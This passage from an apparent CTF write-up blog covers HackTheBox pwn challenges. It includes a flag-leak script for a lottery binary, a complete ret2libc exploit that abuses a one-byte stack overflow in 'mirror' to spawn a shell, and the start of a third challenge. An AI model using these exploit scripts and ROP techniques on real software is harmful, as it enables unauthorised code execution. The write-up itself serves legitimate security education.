+</span><span>  cosy_coins </span><span style="color:#f29e74;">=</span><span> cosy_coins </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">269</span><span style="color:#ccc9c2cc;">.</span><span style="color:#ffcc66;">00000000</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_40 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  __fd </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">open</span><span>(</span><span style="color:#bae67e;">&quot;./flag.txt&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(__fd </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>    </span><span style="color:#f28779;">fwrite</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">Error opening flag, exiting..</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x1f</span><span style="color:#ccc9c2cc;">,</span><span>stderr)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>    </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0x6969</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffd580;">read</span><span>(__fd</span><span style="color:#ccc9c2cc;">,</span><span>local_38</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x21</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">while </span><span>(local_40 </span><span style="color:#f29e74;">&lt; </span><span style="color:#ffcc66;">0x21</span><span>) {
+</span><span>    local_38[local_40] </span><span style="color:#f29e74;">=</span><span> local_38[local_40] </span><span style="color:#f29e74;">^</span><span> lucky_number[local_40]</span><span style="color:#ccc9c2cc;">;
+</span><span>    local_40 </span><span style="color:#f29e74;">=</span><span> local_40 </span><span style="color:#f29e74;">+ </span><span style="color:#ffcc66;">1</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#ffd580;">close</span><span>(__fd)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#ffcc66;">%s</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>local_38)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>  </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0xa9</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>So, we get the flag if <code>prize_flag</code> is true or if we have more than 100 coins.  It's pretty trivial to get more than 100 coins which makes it quite unfortunate that what we actually get is the flag bitwise XORed with our lucky number.</p>
+<h2 id="putting-it-all-together">putting it all together</h2>
+<p>So, we can print out the flag XORed with our lucky number but where do we go from there?  It's populated with random bytes at startup and attacking <code>/dev/urandom</code> would be tough at best.  If you'll recall, the generate function uses <code>strcpy</code> to copy the randomly generated bytes into <code>lucky_number</code> which will always copy a null terminator also.  This means that if generate n random bytes then there will be a null byte in <code>lucky_number[n]</code> which means we can leak a single byte of the flag.  We can then just do this multiple times to leak every character and then attach them together.</p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span>
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;rigged_lottery&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path])
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        </span><span style="color:#ffa759;">return </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;docker.hackthebox.eu&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">30269</span><span>)
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>
+</span><span>    buf </span><span style="color:#f29e74;">= </span><span style="color:#bae67e;">&quot;&quot;
+</span><span>    </span><span style="color:#ffa759;">for </span><span>i </span><span style="color:#ffa759;">in </span><span style="color:#f28779;">range</span><span>(</span><span style="color:#f28779;">len</span><span>(buf)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">32</span><span>):
+</span><span>        r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;4. Exit.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;2&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;-300&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;4. Exit.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;1&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="font-style:italic;color:#5ccfe6;">str</span><span>(i))
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;4. Exit.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">sendline</span><span>(</span><span style="color:#bae67e;">&quot;3&quot;</span><span>)
+</span><span>        r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;prize!!</span><span style="color:#95e6cb;">\n\n</span><span style="color:#bae67e;">&quot;</span><span>)
+</span><span>        res </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvall</span><span>()
+</span><span>        buf </span><span style="color:#f29e74;">+= </span><span style="color:#f28779;">chr</span><span>(res[i])
+</span><span>        </span><span style="color:#f28779;">print</span><span>(buf)
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ python rigged_lottery.py SILENT=1
+</span><span>HTB{strcpy_0nly_c4us3s_tr0ubl3!}
+</span></code></pre>
+<h1 id="mirror">mirror</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>You found an ol&#39; dirty mirror inside an abandoned house. This magic mirror reflects your most hidden desires! Use it to reveal the things you want the most in life! Don&#39;t say too much though..
+</span></code></pre>
+<h2 id="initial-review-2">initial review</h2>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ checksec mirror
+</span><span>[*] &#39;/home/sky/Dropbox/ctf/hackthebox-uni-ctf-2020/pwn/mirror&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Full RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ ./mirror
+</span><span>✨ This old mirror seems to contain some hidden power..✨
+</span><span>There is a writing at the bottom of it..
+</span><span>&quot;The mirror will reveal whatever you desire the most.. Just talk to it..&quot;
+</span><span>Do you want to talk to the mirror? (y/n)
+</span><span>&gt; y
+</span><span>Your answer was: y
+</span><span>&quot;This is a gift from the craftsman.. [0x7ffeb133f5b0] [0x7f9a77796b10]&quot;
+</span><span>Now you can talk to the mirror.
+</span><span>&gt; hi
+</span></code></pre>
+<p>No canary and we get a couple addresses to help bypass PIE.  Let's take a look at what those addresses are and see if we can find where our stack overflow is.</p>
+<h3 id="main-1">main</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span>undefined8 </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  undefined8 local_28</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 local_20</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 local_18</span><span style="color:#ccc9c2cc;">;
+</span><span>  undefined8 local_10</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  </span><span style="color:#ffd580;">setup</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_28 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_20 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_18 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  local_10 </span><span style="color:#f29e74;">= </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(
+</span><span>      </span><span style="color:#bae67e;">&quot;✨ This old mirror seems to contain some hidden power..✨</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">There is a writing at the bottom ofit..&quot;
+</span><span>      )</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">The mirror will reveal whatever you desire the most.. Just talk to it..</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Do you want to talk to the mirror? (y/n)</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#f29e74;">&amp;</span><span>local_28</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x1f</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(((</span><span style="color:#ffa759;">char</span><span>)local_28 </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&#39;y&#39;</span><span>) </span><span style="color:#f29e74;">&amp;&amp; </span><span>((</span><span style="color:#ffa759;">char</span><span>)local_28 </span><span style="color:#f29e74;">!= </span><span style="color:#bae67e;">&#39;Y&#39;</span><span>)) {
+</span><span>    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;You left the abandoned house safe!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>    </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">0x45</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Your answer was: &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>((</span><span style="color:#ffa759;">char </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#f29e74;">&amp;</span><span>local_28)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffd580;">reveal</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<h3 id="reveal">reveal</h3>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">reveal</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  undefined local_28 [</span><span style="color:#ffcc66;">32</span><span>]</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="color:#95e6cb;">\&quot;</span><span style="color:#bae67e;">This is a gift from the craftsman.. [</span><span style="color:#ffcc66;">%p</span><span style="color:#bae67e;">] [</span><span style="color:#ffcc66;">%p</span><span style="color:#bae67e;">]</span><span style="color:#95e6cb;">\&quot;\n</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">,</span><span>local_28</span><span style="color:#ccc9c2cc;">,</span><span>printf)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#f28779;">printf</span><span>(</span><span style="color:#bae67e;">&quot;Now you can talk to the mirror.</span><span style="color:#95e6cb;">\n</span><span style="color:#bae67e;">&gt; &quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* Overruns using local_28(+0,1,40) */
+</span><span>  </span><span style="color:#ffd580;">read</span><span>(</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span>local_28</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x21</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">return</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>So, we have a one byte overrun from local_28 which means we can control the lower byte of the stored stack base pointer.  The addresses it gives us are a variable on the stack and the location of printf.</p>
+<h2 id="leaking-libc">leaking libc</h2>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ nc docker.hackthebox.eu 30272
+</span><span>✨ This old mirror seems to contain some hidden power..✨
+</span><span>There is a writing at the bottom of it..
+</span><span>&quot;The mirror will reveal whatever you desire the most.. Just talk to it..&quot;
+</span><span>Do you want to talk to the mirror? (y/n)
+</span><span>&gt; y
+</span><span>Your answer was: y
+</span><span>&quot;This is a gift from the craftsman.. [0x7ffda86edb00] [0x7f572b026f70]&quot;
+</span><span>Now you can talk to the mirror.
+</span><span>&gt; ^C
+</span></code></pre>
+<p>I will be using the lovely <a href="https://github.com/niklasb/libc-database">libc-database</a> to figure out the libc version from the printf address it prints.  ASLR means the upper bits are useless but the lower 12 are fixed and so can be used to determine the libc version.</p>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ ./find printf f70
+</span><span>ubuntu-old-glibc (libc6_2.24-9ubuntu2.2_i386)
+</span><span>ubuntu-old-glibc (libc6_2.24-9ubuntu2_i386)
+</span><span>ubuntu-glibc (libc6_2.27-3ubuntu1.3_amd64)
+</span><span>debian-glibc (libc6_2.31-4_i386)
+</span></code></pre>
+<p>We have four candidates, only one of which is amd64 so it's pretty easy to pick from them.  The server is likely running libc 2.27.</p>
+<h2 id="putting-it-all-together-1">putting it all together</h2>
+<p>We only have a single byte overrun so we can't overwrite the return pointer directly but as it turns out we don't need to because the main function returns after <code>reveal</code> finishes.  The "true" stored stack base pointer and the address of the buffer we're writing to only differ by a single byte so we can overwrite that byte and when <code>reveal</code> returns it will adjust the stack frame such that when main returns it looks to the beginning of our buffer for the return pointer.  We also know the libc version and the address of a symbol within libc so we can perform a <a href="https://en.wikipedia.org/wiki/Return-to-libc_attack">ret2libc</a> attack and call <code>system("/bin/sh")</code></p>
+<pre data-lang="python" style="background-color:#212733;color:#ccc9c2;" class="language-python "><code class="language-python" data-lang="python"><span style="font-style:italic;color:#5c6773;">#!/usr/bin/env python3
+</span><span>
+</span><span style="color:#ffa759;">from </span><span>pwn </span><span style="color:#ffa759;">import </span><span style="color:#ffcc66;">*
+</span><span style="color:#ffa759;">import </span><span>re
+</span><span>exe </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;mirror&quot;</span><span>)
+</span><span>
+</span><span>context</span><span style="color:#f29e74;">.</span><span>binary </span><span style="color:#f29e74;">= </span><span>exe
+</span><span>context</span><span style="color:#f29e74;">.</span><span>terminal </span><span style="color:#f29e74;">= </span><span>[</span><span style="color:#bae67e;">&quot;termite&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#bae67e;">&quot;-e&quot;</span><span>]
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">conn</span><span>():
+</span><span>    </span><span style="color:#ffa759;">if </span><span>args</span><span style="color:#f29e74;">.</span><span>LOCAL:
+</span><span>        libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;/home/sky/libc-database/db/libc-2.32-5-x86_64.so&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>(libc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">process</span><span>([exe</span><span style="color:#f29e74;">.</span><span>path]))
+</span><span>    </span><span style="color:#ffa759;">else</span><span>:
+</span><span>        libc </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ELF</span><span>(</span><span style="color:#bae67e;">&quot;/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so&quot;</span><span>)
+</span><span>        </span><span style="color:#ffa759;">return </span><span>(libc</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffd580;">remote</span><span>(</span><span style="color:#bae67e;">&quot;docker.hackthebox.eu&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">30272</span><span>))
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">send_padded</span><span>(</span><span style="color:#ffcc66;">r</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">msg</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">l</span><span>):
+</span><span>    </span><span style="color:#ffa759;">assert </span><span style="color:#f28779;">len</span><span>(msg) </span><span style="color:#f29e74;">&lt;= </span><span>l
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(msg </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;A&quot; </span><span style="color:#f29e74;">* </span><span>(l </span><span style="color:#f29e74;">- </span><span style="color:#f28779;">len</span><span>(msg)))
+</span><span>
+</span><span style="color:#ffa759;">def </span><span style="color:#ffd580;">main</span><span>():
+</span><span>    libc, r </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">conn</span><span>()
+</span><span>
+</span><span>    libc_rop </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ROP</span><span>(libc)
+</span><span>    POP_RDI </span><span style="color:#f29e74;">= </span><span>(libc_rop</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">find_gadget</span><span>([</span><span style="color:#bae67e;">&#39;pop rdi&#39;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#bae67e;">&#39;ret&#39;</span><span>]))[</span><span style="color:#ffcc66;">0</span><span>]
+</span><span>
+</span><span>    </span><span style="color:#ffd580;">send_padded</span><span>(r</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;y&quot;</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0x1f</span><span>)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvuntil</span><span>(</span><span style="color:#bae67e;">&quot;This is a gift from the craftsman..&quot;</span><span>)
+</span><span>    addresses </span><span style="color:#f29e74;">= </span><span>r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">recvline</span><span>()</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">decode</span><span>()
+</span><span>
+</span><span>    capture </span><span style="color:#f29e74;">= </span><span>re</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#bae67e;">&quot;</span><span style="background-color:#ffa759;color:#ffffff;">\[</span><span style="color:#bae67e;">(.*)</span><span style="background-color:#ffa759;color:#ffffff;">\]</span><span style="color:#bae67e;"> </span><span style="background-color:#ffa759;color:#ffffff;">\[</span><span style="color:#bae67e;">(.*)</span><span style="background-color:#ffa759;color:#ffffff;">\]</span><span style="color:#bae67e;">&quot;</span><span style="color:#ccc9c2cc;">, </span><span>addresses)
+</span><span>    stack_addr </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(capture</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>)
+</span><span>    printf_addr </span><span style="color:#f29e74;">= </span><span style="font-style:italic;color:#5ccfe6;">int</span><span>(capture</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">group</span><span>(</span><span style="color:#ffcc66;">2</span><span>)</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">16</span><span>)
+</span><span>    stack_exec_addr </span><span style="color:#f29e74;">= </span><span>stack_addr </span><span style="color:#f29e74;">- </span><span style="color:#ffcc66;">8 </span><span style="font-style:italic;color:#5c6773;"># gotta move this back 8 bytes so that the stored return pointer is at the front of our buffer
+</span><span>    libc_base </span><span style="color:#f29e74;">= </span><span>printf_addr </span><span style="color:#f29e74;">- </span><span>libc</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&quot;printf&quot;</span><span>]
+</span><span>
+</span><span>    libc</span><span style="color:#f29e74;">.</span><span>address </span><span style="color:#f29e74;">= </span><span>libc_base
+</span><span>    buf </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">p64</span><span>(libc_base </span><span style="color:#f29e74;">+ </span><span>POP_RDI) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(</span><span style="color:#f28779;">next</span><span>(libc</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">search</span><span>(</span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;/bin/sh&quot;</span><span>))) </span><span style="color:#f29e74;">+ </span><span style="color:#ffd580;">p64</span><span>(libc</span><span style="color:#f29e74;">.</span><span>symbols[</span><span style="color:#bae67e;">&#39;system&#39;</span><span>]) </span><span style="color:#f29e74;">+ </span><span style="color:#ffa759;">b</span><span style="color:#bae67e;">&quot;B&quot; </span><span style="color:#f29e74;">* </span><span style="color:#ffcc66;">8 </span><span style="color:#f29e74;">+ </span><span style="font-style:italic;color:#5ccfe6;">bytes</span><span>([(stack_exec_addr) </span><span style="color:#f29e74;">&amp; </span><span style="color:#ffcc66;">0xff</span><span>])
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">send</span><span>(buf)
+</span><span>    </span><span style="font-style:italic;color:#5c6773;"># good luck pwning :)
+</span><span>
+</span><span>    r</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">interactive</span><span>()
+</span><span>
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>__name__ </span><span style="color:#f29e74;">== </span><span style="color:#bae67e;">&quot;__main__&quot;</span><span>:
+</span><span>    </span><span style="color:#ffd580;">main</span><span>()
+</span></code></pre>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>❯ python mirror.py
+</span><span>[*] &#39;/home/sky/Dropbox/ctf/hackthebox-uni-ctf-2020/pwn/mirror&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Full RELRO
+</span><span>    Stack:    No canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span><span>[*] &#39;/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so&#39;
+</span><span>    Arch:     amd64-64-little
+</span><span>    RELRO:    Partial RELRO
+</span><span>    Stack:    Canary found
+</span><span>    NX:       NX enabled
+</span><span>    PIE:      PIE enabled
+</span><span>[+] Opening connection to docker.hackthebox.eu on port 30272: Done
+</span><span>[*] Loading gadgets for &#39;/home/sky/libc-database/db/libc6_2.27-3ubuntu1.3_amd64.so&#39;
+</span><span>[*] Switching to interactive mode
+</span><span>Now you can talk to the mirror.
+</span><span>&gt; $ cat flag.txt
+</span><span>HTB{0n3_byt3_cl0s3r_2_v1ct0ry}
+</span><span>$  
+</span></code></pre>
+<h1 id="hi-my-name-is-what">Hi! My name is (what?)</h1>
+<pre data-lang="text" style="background-color:#212733;color:#ccc9c2;" class="language-text "><code class="language-text" data-lang="text"><span>I&#39;ve been once told that my name is difficult to pronounce and since then I&#39;m using it as a password for everything.
+</span></code></pre>
+<h2 id="initial-review-3">initial review</h2>
+<pre data-lang="c" style="background-color:#212733;color:#ccc9c2;" class="language-c "><code class="language-c" data-lang="c"><span style="color:#ffa759;">void </span><span style="color:#ffd580;">main</span><span>(</span><span style="color:#ffa759;">void</span><span>)
+</span><span>
+</span><span>{
+</span><span>  EVP_PKEY_CTX </span><span style="color:#f29e74;">*</span><span>ctx</span><span style="color:#ccc9c2cc;">;
+</span><span>  __uid_t __uid</span><span style="color:#ccc9c2cc;">;
+</span><span>  passwd </span><span style="color:#f29e74;">*</span><span>ppVar1</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">long</span><span> lVar2</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> iVar3</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">size_t </span><span>sVar4</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">size_t </span><span style="color:#f29e74;">*</span><span>outlen</span><span style="color:#ccc9c2cc;">;
+</span><span>  uchar </span><span style="color:#f29e74;">*</span><span>in</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">size_t</span><span> in_stack_ffffffd0</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">int</span><span> local_28</span><span style="color:#ccc9c2cc;">;
+</span><span>  
+</span><span>  </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;Who are you?&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  __uid </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">geteuid</span><span>()</span><span style="color:#ccc9c2cc;">;
+</span><span>  ppVar1 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">getpwuid</span><span>(__uid)</span><span style="color:#ccc9c2cc;">;
+</span><span>  in </span><span style="color:#f29e74;">= </span><span>(uchar </span><span style="color:#f29e74;">*</span><span>)</span><span style="color:#ffcc66;">0x0</span><span style="color:#ccc9c2cc;">;
+</span><span>  lVar2 </span><span style="color:#f29e74;">= </span><span style="color:#ffd580;">ptrace</span><span>(PTRACE_TRACEME</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,</span><span style="color:#ffcc66;">0</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  </span><span style="color:#ffa759;">if </span><span>(lVar2 </span><span style="color:#f29e74;">!= </span><span style="color:#ffcc66;">0</span><span>) {
+</span><span>    </span><span style="color:#f28779;">puts</span><span>(</span><span style="color:#bae67e;">&quot;This doesn</span><span style="color:#95e6cb;">\&#39;</span><span style="color:#bae67e;">t seem right&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>                    </span><span style="font-style:italic;color:#5c6773;">/* WARNING: Subroutine does not return */
+</span><span>    </span><span style="color:#f28779;">exit</span><span>(</span><span style="color:#ffcc66;">1</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>  }
